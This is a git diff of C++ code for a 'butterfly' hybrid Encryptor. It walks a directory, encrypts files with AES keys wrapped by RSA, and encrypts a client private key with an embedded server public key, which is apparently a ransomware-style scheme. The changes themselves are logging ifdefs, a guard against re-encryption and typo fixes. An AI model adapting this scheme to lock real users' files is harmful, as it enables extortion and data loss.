@@ -7,12 +7,14 @@ namespace butterfly
 namespace hybrid
 {
 
-Encryptor::Encryptor(int keySize, const std::string &aesKeyDBPath) : _keySize(keySize), _aesKeyInit(false), _aesKeyDBPath(aesKeyDBPath),
-                                                                     _rsaEncryptorAESKey(new rsa::RSAEncryptor(_keySize)),
-                                                                     _rsaEncryptorCPrivateRSA(new rsa::RSAEncryptor(rsa::SPUBLIC_PEM)),
-                                                                     _aesEncryptor(new aes::AESEncryptor())
+Encryptor::Encryptor(int keySize) : _keySize(keySize), _aesKeyInit(false),
+                                    _rsaEncryptorAESKey(new rsa::RSAEncryptor(_keySize)),
+                                    _rsaEncryptorCPrivateRSA(new rsa::RSAEncryptor(rsa::SPUBLIC_PEM)),
+                                    _aesEncryptor(new aes::AESEncryptor())
 {
+    #ifdef LOGGING
     LOG_TRACE("Create class Encryptor");
+    #endif
 }
 
 void Encryptor::validateAESKeyLength()
@@ -30,7 +32,9 @@ void Encryptor::validateAESKeyLength()
         aeskey = _aesEncryptor->getAESKey();
         aesiv = _aesEncryptor->getAESIv();
         aeskeypair = _aesEncryptor->getAESKeyPair();
+        #ifdef LOGGING
         LOG_TRACE("Generated AESKey: " << aeskey << " with Length: " << aeskey.length() << " and AESIV: " <<  aesiv << " with Length: " << aesiv.length() << " and AESKeyPairLength: " << aeskeypair.length());
+        #endif
         _aesKeyInit = true;
 
     }
@@ -43,14 +47,33 @@ void Encryptor::saveUnencryptedAESKeyPair(const std::string &aesKeyPair)
     // 32 Bytes AESKey + 16 Bytes IV
     if ( !butterfly::writeBinFile(butterfly::UNENC_AESKEY_FILENAME, aesKeyPair.c_str(), static_cast<long>(aesKeyPair.length())) )
     {
+        #ifdef LOGGING
         LOG_ERROR("Could not save the unencrypted AESKeyPair File to Filesystem!");
+        #else
         std::cerr << "Could not save the unencrypted AESKeyPair File to Filesystem!" << std::endl;
+        #endif
     }
 
 }
 
+void Encryptor::checkIfEncryptionFilesExists()
+{
+    if ( butterfly::existsFile(butterfly::ENC_CPRIVATERSA_FILENAME) && butterfly::existsFile(butterfly::ENC_AESKEY_FILENAME) && butterfly::existsFile(butterfly::RSA_EKIV_FILENAME) )
+    {
+        #ifdef LOGGING
+        LOG_ERROR("Aborting encryption because encryption files (" << butterfly::ENC_CPRIVATERSA_FILENAME << ", " << butterfly::ENC_AESKEY_FILENAME << ", " << butterfly::RSA_EKIV_FILENAME <<") already exists!")
+        #else
+        std::cerr << "Aborting encryption because encryption files already exists!" << std::endl;
+        #endif
+        exit(1);
+    }
+}
+
 void Encryptor::invokeDir(const std::string &dirPath, bool protection)
 {
+    // Ensure that no encryption files already exists!
+    checkIfEncryptionFilesExists();
+
     // Encrypt the CPrivateRSA.pem String to CPrivateRSA.bin
     encryptCPrivateRSA();
 
@@ -69,7 +92,9 @@ void Encryptor::invokeDir(const std::string &dirPath, bool protection)
     // If --protected is enabled
     if (protection)
     {
-        //LOG_TRACE("Length of AESKEY: " << aeskey.length() << " and length of AESIV: " << aesiv.length());
+        #ifdef LOGGING
+        LOG_TRACE("Length of AESKEYPair: " << aeskeypair.length());
+        #endif
         saveUnencryptedAESKeyPair(aeskeypair);
     }
 
@@ -83,7 +108,9 @@ void Encryptor::invokeDir(const std::string &dirPath, bool protection)
             // Compare file size with the MAX FILE SIZE
             if ( butterfly::getFileSize(file.string(), true) > butterfly::MAX_FILE_SIZE )
             {
+                #ifdef LOGGING
                 LOG_TRACE("Spawn a new encryption thread for file: " << file.string());
+                #endif
                 spawnThread(file.string());
             } else
             {
@@ -121,7 +148,8 @@ void Encryptor::encryptCPrivateRSA()
     } catch (RSAEncryptionException &e)
     {
         std::cerr << e.what() << std::endl;
-        throw EncryptorException("Error on encrypting the CPrivateRSA File! RSAEncryptionException: " + std::string(e.what())); // If error occured here, it makes no sense to continue
+        // If error occurred here, it makes no sense to continue
+        throw EncryptorException("Error on encrypting the CPrivateRSA File! RSAEncryptionException: " + std::string(e.what()));
     }
 
 }
@@ -157,7 +185,7 @@ void Encryptor::encryptFinalAESKeyWithRSA(const std::string &aesKeyPair, const s
     } catch (RSAEncryptionException &e)
     {
         std::cerr << e.what() << std::endl;
-        // If error occured here, save AESKeyPair unencrypted to ensure that files can be decrypted manually
+        // If error occurred here, save AESKeyPair unencrypted to ensure that files can be decrypted manually
         saveUnencryptedAESKeyPair(aesKeyPair);
     }
 
